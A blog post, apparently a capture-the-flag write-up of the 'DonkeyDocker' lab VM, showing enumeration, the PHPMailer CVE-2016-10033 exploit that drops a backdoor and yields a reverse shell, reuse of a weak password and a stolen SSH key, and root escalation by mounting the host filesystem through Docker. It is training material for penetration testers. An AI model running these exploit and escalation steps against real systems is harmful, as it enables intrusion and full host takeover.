---
layout: post
title: "Donkey Docker"
date: 2019-04-15 21:02:36 +0300
comments: true
categories: [penetration testing, writeups]
keywords: donkey docker, pentest lab, vulnhub, ctf, boot2root, docker, phpmailer
description: Donkey Docker writeup
---

Today's target is called DonkeyDocker, so we should expect a Docker component! The level is intermediate to hard.

<!-- more -->

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 9c:38:ce:11:9c:b2:7a:48:58:c9:76:d5:b8:bd:bd:57 (RSA)
|   256 d7:5e:f2:17:bd:18:1b:9c:8c:ab:11:09:e8:a0:00:c2 (ECDSA)
|_  256 06:f0:0c:d8:bc:9b:21:95:a5:d2:70:39:08:57:b3:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 3 disallowed entries
|_/contact.php /index.php /about.php
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Docker Donkey
```

Not much to work with, let's hit the web server first. Nothing interesting on the home page and the contact page d, but going to the about page gives an error that something went wrong.


In the HTML source, I found a comment:

``` html
<!-- FIXME!: www-path: /www -->
```

Didn't find such a path with my enumeration. I fired up Gobuster next:

```
gobuster -u http://192.168.159.132/ -w /usr/share/wordlists/dirb/big.txt -q -t 20
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/about (Status: 200)
/assets (Status: 301)
/contact (Status: 200)
/css (Status: 301)
/dist (Status: 301)
/index (Status: 200)
/mailer (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
```

Trying those folders gave me 403 errors, so the next thing I did was to enumerate those folders themselves, and got an interesting hit with the /mailer folder:

```
gobuster -u http://192.168.159.132/mailer -w /usr/share/wordlists/dirb/big.txt -q -t 20
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/LICENSE (Status: 200)
/docs (Status: 301)
/examples (Status: 301)
/extras (Status: 301)
/language (Status: 301)
/test (Status: 301)
```

Going to /mailer/examples/ reveals a PHPMailer installation. From the Github files, it should also have a VERSION file, so I went to http://192.168.159.132/mailer/VERSION and was rewarded with the version number: 5.2.16. I found a Metasploit exploit:

> PHPMailer versions up to and including 5.2.19 are affected by a
>  vulnerability which can be leveraged by an attacker to write a file
>  with partially controlled contents to an arbitrary location through
>  injection of arguments that are passed to the sendmail binary. This
>  module writes a payload to the web root of the webserver before then
>  executing it with an HTTP request. The user running PHPMailer must
>  have write access to the specified WEB_ROOT directory and successful
>  exploitation can take a few minutes.

This one didn't work for me, so I found another one with [searchsploit](https://www.exploit-db.com/exploits/40974). To make it work, I had to install requests_toolbelt and delete the banner that was giving an encoding error. Inside the code I changed the IP and port in the payload and added the target URL:

```python
target = 'http://192.168.159.132/contact'
```

Per the [advisory](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html):

> To exploit the vulnerability an attacker could target common website
> components such as contact/feedback forms, registration forms, password
> email resets and others that send out emails with the help of a vulnerable
> version of the PHPMailer class.

After finishing the modifications, I ran it:

``` plain
PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com
Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski

[+] SeNdiNG eVIl SHeLL To TaRGeT....
[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D
```

With a listener on, I went to http://192.168.159.132/backdoor and got a reverse shell:

```
nc -vnlp 9000
listening on [any] 9000 ...
connect to [192.168.159.129] from (UNKNOWN) [192.168.159.132] 50930
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@12081bd067cc:/www$
```

From the hostname, we seem to be inside a Docker container. In the root directory I found a script:

```
www-data@12081bd067cc:/www$ cat /main.sh
cat /main.sh
#!/bin/bash

# change permission
chown smith:users /home/smith/flag.txt

# Start apache
source /etc/apache2/envvars
a2enmod rewrite
apachectl -f /etc/apache2/apache2.conf

sleep 3
tail -f /var/log/apache2/*&

# Start our fake smtp server
python -m smtpd -n -c DebuggingServer localhost:25
```

Interesting, there is a flag available for user smith. I switched to this user and tried the password smith and it worked:

```
smith@12081bd067cc:~$ ls -al
ls -al
total 28
drwx------ 1 smith users 4096 Mar 26  2017 .
drwxr-xr-x 1 root  root  4096 Mar 26  2017 ..
-rw-r--r-- 1 smith users  220 Nov  5  2016 .bash_logout
-rw-r--r-- 1 smith users 3515 Nov  5  2016 .bashrc
-rw-r--r-- 1 smith users  675 Nov  5  2016 .profile
drwx--S--- 2 smith users 4096 Mar 22  2017 .ssh
-rw-r--r-- 1 smith users  237 Mar 22  2017 flag.txt
smith@12081bd067cc:~$ cat flag.txt
cat flag.txt
This is not the end, sorry dude. Look deeper!
I know nobody created a user into a docker
container but who cares? ;-)

But good work!
Here a flag for you: flag0{9fe3ed7d67635868567e290c6a490f8e}

PS: I like 1984 written by George ORWELL
```

Inside smith's home we also have a .ssh folder. Inside we have a pair of private-public keys.

```
-rwx------ 1 smith users  411 Mar 22  2017 id_ed25519
-rwx------ 1 smith users  101 Mar 22  2017 id_ed25519.pub
smith@12081bd067cc:~/.ssh$ cat id_ed25519.pub
cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker
```

And the SSH user is orwell. So let's copy the private key to our machine and try to SSH in as orwell:

```
ssh -i id_ed25519 orwell@192.168.159.132
Welcome to

  ___           _            ___          _
 |   \ ___ _ _ | |_____ _  _|   \ ___  __| |_____ _ _
 | |) / _ \ ' \| / / -_) || | |) / _ \/ _| / / -_) '_|
 |___/\___/_||_|_\_\___|\_, |___/\___/\__|_\_\___|_|
                        |__/
                             Made with <3 v.1.0 - 2017

This is my first boot2root - CTF VM. I hope you enjoy it.
if you run into any issue you can find me on Twitter: @dhn_
or feel free to write me a mail to:

 - Email: dhn@zer0-day.pw
 - GPG key: 0x2641123C
 - GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C

Level:       I think the level of this boot2root challange
             is hard or intermediate.

Try harder!: If you are confused or frustrated don't forget
             that enumeration is the key!

Thanks:      Special thanks to @1nternaut for the awesome
             CTF VM name!

Feedback:    This is my first boot2root - CTF VM, please
             give me feedback on how to improve!

Looking forward to the write-ups!

donkeydocker:~$
```

It worked! In orwell's home we find another flag:

```
donkeydocker:~$ ls -al /home/orwell
total 24
drwxr-sr-x    3 orwell   orwell        4096 Mar 26  2017 .
drwxr-xr-x    3 root     root          4096 Mar 22  2017 ..
-rw-r--r--    1 root     orwell           1 Mar 26  2017 .ash
-rw-------    1 orwell   orwell          45 Apr 15 18:12 .ash_history
drwx--S---    2 orwell   users         4096 Mar 22  2017 .ssh
-rw-r--r--    1 orwell   orwell         104 Mar 22  2017 flag.txt
donkeydocker:~$ cat flag.txt
You tried harder! Good work ;-)

Here a flag for your effort: flag01{e20523853d6733721071c2a4e95c9c60}
```

Now we seem to be on the Docker host itself. Let's confirm:

```
donkeydocker:~$ docker ps
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 4 hours          0.0.0.0:80->80/tcp   donkeydocker
```

We can see the container we were in previously. Now, for the next step, I used as reference this blog post about [Docker privilege escalation](https://fosterelli.co/privilege-escalation-via-docker.html). The highlights are :

> If you happen to have gotten access to a user-account on a machine, and that user is a member of the ‘docker’ group, running the following command will give you a root shell:
> docker run -v /:/hostOS -i -t chrisfosterelli/rootplease

> The command you run to perform the privilege escalation fetches my Docker image from the Docker Hub Registry and runs it. The -v parameter that you pass to Docker specifies
> that you want to create a volume in the Docker instance. The -i and -t parameters put Docker into ‘shell mode’ rather than starting a daemon process.

> The instance is set up to mount the root filesystem of the host machine to the instance’s volume, so when the instance starts it immediately loads a chroot into that volume.
> This effectively gives you root on the machine.

And if we look at the groups that orwell is a part of, we can see that he is indeed a member of the docker group:

```
donkeydocker:~$ id
uid=1000(orwell) gid=1000(orwell) groups=101(docker),1000(orwell)
```

Let's look at the available containers now:

```
donkeydocker:~$ docker container ls
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 32 minutes       0.0.0.0:80->80/tcp   donkeydocker
```

We can create a new container in the background which is based on the donkeydocker one and mount the host filesystem in it:

```
donkeydocker:~$ docker run -d -v /:/host donkeydocker
103cd9c625b0cf04e1ed173d95e56724051a708300a07d75c20618472eefe863
```

Now we should find the host / contents in the /host directory inside the container. Let's verify that it was created:

```
donkeydocker:~$ docker container ls
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
103cd9c625b0        donkeydocker        "/main.sh default"   4 seconds ago       Up 3 seconds        80/tcp               epic_lovelace
12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 34 minutes       0.0.0.0:80->80/tcp   donkeydocker
```

And now we can run a root shell inside the container and read the host flag:

```
donkeydocker:~$ docker exec -i -t 103cd9c625b0 /bin/bash
root@103cd9c625b0:/# ls /host/root
donkeydocker  flag.txt
root@103cd9c625b0:/# cat /host/root/flag.txt
YES!! You did it :-). Congratulations!

I hope you enjoyed this CTF VM.

Drop me a line on twitter @dhn_, or via email dhn@zer0-day.pw

Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
```

Nice Docker twist on this VM! To recap the steps:

- Web directory enumeration revealed a vulnerable PHPMailer installation that gave a shell as the www-data
- the shell was inside a docker container. A script placed in the root filesystem revealed a smith user that had the username as password
- the smith user had the SSH keys for a user orwell on the host and we were able to SSH directly as that user with the private key
- user orwell was member of the docker group and it was possible to escalate privileges by mounting the root filesystem inside a container 

``` 
______________________________________
/ Your motives for doing whatever good \
| deed you may have in mind will be    |
\ misinterpreted by somebody.          /
 --------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
